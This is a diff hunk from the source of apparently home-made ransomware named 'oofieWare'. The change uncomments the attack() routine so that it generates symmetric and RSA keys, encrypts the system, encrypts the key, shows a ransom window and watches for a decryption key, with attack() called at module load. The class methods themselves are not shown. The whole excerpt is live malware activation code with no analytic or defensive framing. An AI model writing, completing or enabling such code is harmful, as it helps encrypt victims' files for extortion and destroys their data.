@@ -289,16 +289,16 @@ class oofieWare:
 
 def attack():
     oof = oofieWare(gen_rsa = True)
-    # oof.gen_sym_key()
-    # oof.gen_rsa_keypair()
-    # oof.crypt_system()
-    # oof.show_sym_key() # for debugging purposes, DON'T use this line irl
-    # oof.wait_till_finish()
-    # oof.encrypt_key()
-    # elevate = threading.Thread(target = oof.elevate_ransom_window)
-    # elevate.start()
-    # detect = threading.Thread(target = oof.detect_dec_key)
-    # detect.start()
+    oof.gen_sym_key()
+    oof.gen_rsa_keypair()
+    oof.crypt_system()
+    oof.show_sym_key() # for debugging purposes, DON'T use this line irl
+    oof.wait_till_finish()
+    oof.encrypt_key()
+    elevate = threading.Thread(target = oof.elevate_ransom_window)
+    elevate.start()
+    detect = threading.Thread(target = oof.detect_dec_key)
+    detect.start()
     oof.show_ransom_window()
     
 attack()
